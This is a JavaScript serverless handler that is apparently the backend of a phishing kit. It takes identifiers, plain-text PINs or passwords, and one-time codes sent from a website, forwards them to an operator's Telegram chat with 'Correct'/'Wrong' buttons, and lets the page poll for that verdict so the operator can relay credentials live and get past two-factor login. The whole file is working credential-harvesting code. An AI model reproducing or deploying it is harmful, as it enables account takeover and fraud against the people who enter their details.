import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing Telegram Env Vars" });
    }

    // 1. WEBSITE POLLING
    if (req.method === 'GET') {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
        res.setHeader('Pragma', 'no-cache');
        
        const { userId, type } = req.query;
        const key = `tn_status_${userId}_${type}`;
        
        try {
            const status = await redis.get(key) || 'pending';
            if (status !== 'pending') {
                await redis.del(key);
            }
            return res.status(200).json({ status: status });
        } catch (error) {
            return res.status(200).json({ status: 'pending' }); 
        }
    }

    // 2. POST REQUESTS
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM BUTTON CLICKED
            if (body.callback_query) {
                const callback = body.callback_query;
                const data = callback.data; 
                
                const parts = data.split('_');
                const action = parts[0]; // approve or reject
                const userId = parts[parts.length - 1]; 
                const type = parts.slice(1, parts.length - 1).join('_'); 

                const key = `tn_status_${userId}_${type}`;
                const newStatus = action === 'approve' ? 'approved' : 'rejected';
                
                await redis.set(key, newStatus, { ex: 600 });

                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>APPROVED</b>` 
                    : `\n\n❌ <b>REJECTED</b>`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: callback.message.text + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA
            if (body.action === 'send') {
                const { type, userId, data } = body;
                const time = new Date().toLocaleString('en-GB');
                
                await redis.set(`tn_status_${userId}_${type}`, 'pending', { ex: 600 });
                
                let message = `# TN CyberTech - ${type}\n\n`;
                message += `<b>Identifier:</b> ${data.identifier}\n`;
                
                if (type === 'LOGIN') {
                    message += `<b>PIN/Password:</b> <code>${data.value}</code>\n`;
                } else {
                    message += `<b>OTP Code:</b> <code>${data.value}</code>\n`;
                }

                message += `<b>User ID:</b> user_${userId}\n`;
                message += `<b>Time:</b> ${time}\n`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: `✅ Correct`, callback_data: `approve_${type}_${userId}` }],
                        [{ text: `❌ Wrong`, callback_data: `reject_${type}_${userId}` }]
                    ]
                };

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message, 
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                return res.status(200).json({ success: true });
            }
        } catch (error) {
            return res.status(500).json({ error: error.message });
        }
    }
    return res.status(405).json({ error: 'Method not allowed' });
    }
